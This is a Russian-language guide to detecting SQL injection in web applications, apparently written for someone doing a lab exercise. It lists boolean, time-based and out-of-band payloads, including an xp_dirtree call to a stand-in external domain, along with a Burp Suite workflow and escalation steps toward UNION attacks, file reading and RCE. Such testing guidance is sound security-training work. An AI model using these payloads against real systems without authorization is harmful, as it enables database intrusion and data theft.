Руководство по обнаружению SQL-инъекций
📋 Методы ручного тестирования
1. Базовый тест на синтаксические ошибки
Что делать: Добавьте одинарную кавычку ' в каждый параметр приложения
Что искать: Сообщения об ошибках базы данных или необычное поведение приложения

2. Тестирование логических условий
Шаг A: Отправьте условие, которое всегда истинно:

text
параметр=значение' OR '1'='1
Шаг B: Отправьте условие, которое всегда ложно:

text
параметр=значение' OR '1'='2
Сравните ответы: Если ответы различаются — возможна SQL-инъекция

3. Проверка преобразования значений
Используйте SQL-выражения, которые возвращают одинаковый результат:

text
параметр=значение' AND '1'='1
параметр=значение' AND '1'='2
Ищите систематические различия в ответах сервера

4. Тестирование временных задержек (Time-based)
Добавьте команды, которые вызывают паузу в выполнении запроса:

text
параметр=значение'; WAITFOR DELAY '0:0:10'--  (SQL Server)
параметр=значение'; SELECT pg_sleep(10)--      (PostgreSQL)
параметр=значение'; SELECT SLEEP(10)--         (MySQL)
Измеряйте время ответа: Задержка 10+ секунд указывает на уязвимость

5. Внеполосные взаимодействия (OAST)
Используйте payloads, которые заставляют сервер выполнить DNS или HTTP запрос:

text
параметр=значение'; EXEC xp_dirtree '//ваш-домен.xyz/a'--  (SQL Server)
Мониторьте логи на своём сервере — если видите запрос, значит SQL выполняется

🎯 Системный подход к тестированию
Какие точки входа проверять:
GET параметры: ?search=test&id=123

POST параметры: формы входа, поиска, фильтров

HTTP заголовки: Cookies, User-Agent, Referer

JSON/XML данные в API запросах

Файлы cookie (как в вашей лаборатории)

Последовательность действий:
Составьте карту приложения: Все параметры, формы, API endpoints

Для каждого параметра выполните базовые тесты (1-3)

При подозрениях переходите к продвинутым тестам (4-5)

Документируйте всё: Что тестировали, какие payloads, какие ответы

🔧 Пример тестового плана
Для параметра поиска ?q=:
text
1. q=test'              → Ищем ошибки SQL
2. q=test' AND '1'='1   → Ищем изменения контента
3. q=test' AND '1'='2   → Сравниваем с предыдущим
4. q=test'; SELECT SLEEP(5)-- → Проверяем время ответа
🛠️ Автоматизация с Burp Suite
Burp Scanner автоматически проверяет:
Все известные векторы SQL-инъекций

Разные типы БД (MySQL, PostgreSQL, Oracle, SQL Server)

Разные техники (Error-based, Union-based, Blind)

Как использовать:
Перехватите запрос в Burp Proxy

Правой кнопкой → Do active scan

Дождитесь результатов сканирования

⚠️ Важные моменты
Что считать признаком уязвимости:
✅ Ошибки БД в ответе (с указанием SQL синтаксиса)
✅ Разный контент при AND 1=1 vs AND 1=2
✅ Задержки ответа при использовании SLEEP()
✅ DNS/HTTP запросы на ваш сервер
✅ Системные различия в длине ответа или кодах состояния

Что может помешать обнаружению:
❌ WAF (Web Application Firewall) — блокирует подозрительные запросы
❌ Подготовленные выражения (prepared statements) — защищают от SQLi
❌ Кодирование/фильтрация ввода — удаляет опасные символы
❌ Ограничение длины ввода — обрезает payloads

📈 Эскалация тестирования
Если нашли признаки SQLi:
Определите тип БД по синтаксису ошибок

Проверьте права — можно ли читать системные таблицы?

Попробуйте UNION-атаку — можно ли выводить данные?

Проверьте blind-инъекции — если данные не выводятся напрямую

Тестируйте на чтение файлов/RCE — в зависимости от БД и прав
